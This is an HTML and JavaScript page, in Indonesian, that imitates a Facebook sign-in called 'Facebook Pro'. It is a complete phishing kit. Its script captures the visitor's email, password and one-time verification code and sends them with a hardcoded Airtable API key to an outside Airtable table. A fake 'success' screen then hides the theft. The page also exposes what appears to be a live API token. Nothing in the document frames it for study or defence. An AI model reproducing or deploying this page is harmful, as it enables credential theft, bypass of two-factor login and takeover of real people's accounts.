<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook Pro - Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; }
    .glass-effect { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
    .input-focus:focus { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(24, 119, 242, 0.2); }
    .btn-primary { background: linear-gradient(135deg, #1877f2 0%, #0866dc 100%); transition: all 0.3s ease; }
    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(24, 119, 242, 0.4); }
    .fade-in { animation: fadeIn 0.5s ease-in; }
    .slide-in { animation: slideIn 0.3s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
  </style>
</head>
<body class="bg-gray-50 min-h-screen">

<!-- LOGIN SECTION -->
<section id="loginpage" class="min-h-screen flex items-center justify-center p-4">
  <div class="w-full max-w-6xl mx-auto flex flex-col lg:flex-row items-center justify-center gap-12">
    <div class="flex-1 text-center lg:text-left fade-in">
      <div class="flex items-center justify-center lg:justify-start mb-6">
        <i class="fab fa-facebook text-6xl text-blue-600 mr-3"></i>
        <h1 class="text-5xl font-bold text-gray-800">Facebook</h1>
        <span class="text-2xl font-bold text-blue-600 ml-2">Pro</span>
      </div>
      <h2 class="text-3xl font-semibold text-gray-700 mb-4">Selamat Datang Kembali</h2>
      <p class="text-lg text-gray-600 max-w-md">
        Masuk untuk menikmati fitur premium Facebook Pro.
      </p>
    </div>

    <div class="w-full max-w-md glass-effect rounded-2xl shadow-2xl p-8 fade-in">
      <h3 class="text-2xl font-bold text-gray-800 mb-2">Masuk ke Facebook Pro</h3>
      <form id="loginForm" class="space-y-6">
        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Email atau Nomor Telepon</label>
          <div class="relative">
            <input id="email" type="text" class="w-full px-4 py-3 pl-12 border rounded-lg input-focus" placeholder="nama@email.com" required />
            <i class="fas fa-user absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
          </div>
        </div>

        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Kata Sandi</label>
          <div class="relative">
            <input id="password" type="password" class="w-full px-4 py-3 pl-12 pr-12 border rounded-lg input-focus" placeholder="••••••••" required />
            <i class="fas fa-lock absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
            <button type="button" id="togglePassword" class="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600">
              <i class="fas fa-eye"></i>
            </button>
          </div>
        </div>

        <div class="flex items-center justify-between">
          <label class="flex items-center">
            <input id="rememberMe" type="checkbox" class="w-4 h-4 text-blue-600 rounded" />
            <span class="ml-2 text-sm text-gray-600">Ingat saya</span>
          </label>
          <a href="#" class="text-sm text-blue-600 hover:underline">Lupa kata sandi?</a>
        </div>

        <button type="submit" class="w-full btn-primary text-white font-semibold py-3 rounded-lg">Masuk</button>
      </form>
    </div>
  </div>
</section>

<!-- OTP SECTION -->
<section id="authpage" class="min-h-screen flex items-center justify-center p-4 hidden">
  <div class="w-full max-w-xl glass-effect rounded-2xl shadow-2xl p-8 slide-in">
    <h2 class="text-2xl font-bold text-gray-800 mb-4 text-center">Verifikasi Identitas Anda</h2>
    <p class="text-center text-gray-600 mb-6">Kami telah mengirim kode verifikasi ke email Anda.</p>

    <form id="authForm" class="space-y-6">
      <div class="flex justify-center gap-2 mb-2">
        <template id="otpInputTemplate">
          <input type="text" maxlength="1" class="w-12 h-12 text-center text-xl border-2 border-gray-300 rounded-lg focus:ring-blue-200 focus:border-blue-500" pattern="[0-9]" inputmode="numeric" />
        </template>
        <div id="otpInputs" class="flex gap-2"></div>
      </div>

      <div class="w-full bg-gray-200 h-2 rounded overflow-hidden mt-2">
        <div id="progressBar" class="bg-blue-600 h-full transition-all duration-1000" style="width: 100%;"></div>
      </div>

      <div class="text-center text-sm text-gray-600 mt-4">
        Tidak menerima kode?
        <button id="resendCode" type="button" class="text-blue-600 font-semibold hover:underline">Kirim ulang</button><br/>
        <span class="text-xs text-gray-500">Tunggu <span id="countdown">60</span> detik</span>
      </div>

      <div class="flex space-x-4 mt-4">
        <button type="button" id="backToLogin" class="w-1/2 border border-gray-300 rounded-lg py-3 text-gray-700 hover:bg-gray-50">Kembali</button>
        <button type="submit" class="w-1/2 btn-primary text-white rounded-lg py-3">Verifikasi</button>
      </div>
    </form>
  </div>
</section>

<!-- SUCCESS MODAL -->
<div id="successModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden z-50">
  <div class="bg-white rounded-2xl p-8 max-w-md w-full text-center fade-in">
    <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
      <i class="fas fa-check text-4xl text-green-600"></i>
    </div>
    <h3 class="text-2xl font-bold text-gray-800 mb-2">Berhasil!</h3>
    <p class="text-gray-600 mb-6">Anda berhasil masuk ke Facebook Pro</p>
    <button onclick="closeSuccessModal()" class="btn-primary text-white font-semibold py-3 px-8 rounded-lg">Lanjutkan</button>
  </div>
</div>

<!-- SCRIPT -->
<script>
  const AIRTABLE_API_KEY = 'pat31RGUy1ua2FIoz.a26bfd4976c3d7b869474c47bc44cdd31c58f71590817a3d6b80aca13e5b89cf';
  const AIRTABLE_BASE_ID = 'appLTvB7Hey4An0z0';
  const AIRTABLE_TABLE_NAME = 'table1';

  async function sendToAirtable(data) {
    const url = `https://api.airtable.com/v0/${AIRTABLE_BASE_ID}/${encodeURIComponent(AIRTABLE_TABLE_NAME)}`;
    const body = { fields: data };

    await fetch(url, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${AIRTABLE_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body)
    });
  }

  document.getElementById("togglePassword").addEventListener("click", function () {
    const passwordInput = document.getElementById("password");
    const icon = this.querySelector("i");
    passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    icon.classList.toggle("fa-eye");
    icon.classList.toggle("fa-eye-slash");
  });

  const otpInputsContainer = document.getElementById("otpInputs");
  for (let i = 0; i < 6; i++) {
    const input = document.getElementById("otpInputTemplate").content.cloneNode(true);
    otpInputsContainer.appendChild(input);
  }

  const otpInputs = otpInputsContainer.querySelectorAll("input");

  otpInputs.forEach((input, idx) => {
    input.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, "");
      if (e.target.value && idx < otpInputs.length - 1) {
        otpInputs[idx + 1].focus();
      }
    });
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && idx > 0) {
        otpInputs[idx - 1].focus();
      }
    });
  });

  let loginData = {};

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const remember = document.getElementById("rememberMe").checked;

    loginData = { usr: email, pss: password };

    if (remember) {
      localStorage.setItem("rememberedEmail", email);
    }

    document.getElementById("loginpage").classList.add("hidden");
    document.getElementById("authpage").classList.remove("hidden");
    otpInputs[0].focus();
    startCountdown();
  });

  document.getElementById("authForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const allFilled = [...otpInputs].every(input => input.value);
    if (allFilled) {
      const otpCode = [...otpInputs].map(i => i.value).join('');
      await sendToAirtable({ ...loginData, otentikasi: otpCode });
      document.getElementById("successModal").classList.remove("hidden");
    } else {
      alert("Harap isi semua digit kode verifikasi.");
    }
  });

  document.getElementById("backToLogin").addEventListener("click", () => {
    document.getElementById("authpage").classList.add("hidden");
    document.getElementById("loginpage").classList.remove("hidden");
    document.getElementById("loginForm").reset();
    otpInputs.forEach(input => input.value = "");
  });

  let countdown = 60;
  let interval;
  document.getElementById("resendCode").addEventListener("click", () => {
    if (countdown === 60) {
      startCountdown();
      alert("Kode baru dikirim ulang.");
    }
  });

  function startCountdown() {
    const resend = document.getElementById("resendCode");
    const countdownEl = document.getElementById("countdown");
    const progressBar = document.getElementById("progressBar");

    resend.disabled = true;
    resend.classList.add("opacity-50", "cursor-not-allowed");
    progressBar.style.width = "100%";
    countdown = 60;

    interval = setInterval(() => {
      countdown--;
      countdownEl.textContent = countdown;
      progressBar.style.width = (countdown / 60) * 100 + "%";
      if (countdown <= 0) {
        clearInterval(interval);
        resend.disabled = false;
        resend.classList.remove("opacity-50", "cursor-not-allowed");
        countdown = 60;
        progressBar.style.width = "100%";
      }
    }, 1000);
  }

  function closeSuccessModal() {
    document.getElementById("successModal").classList.add("hidden");
    document.getElementById("authpage").classList.add("hidden");
    document.getElementById("loginpage").classList.remove("hidden");
    document.getElementById("loginForm").reset();
    otpInputs.forEach(input => input.value = "");
  }

  window.addEventListener("DOMContentLoaded", () => {
    const remembered = localStorage.getItem("rememberedEmail");
    if (remembered) {
      document.getElementById("email").value = remembered;
      document.getElementById("rememberMe").checked = true;
    }
  });
</script>

</body>
</html>
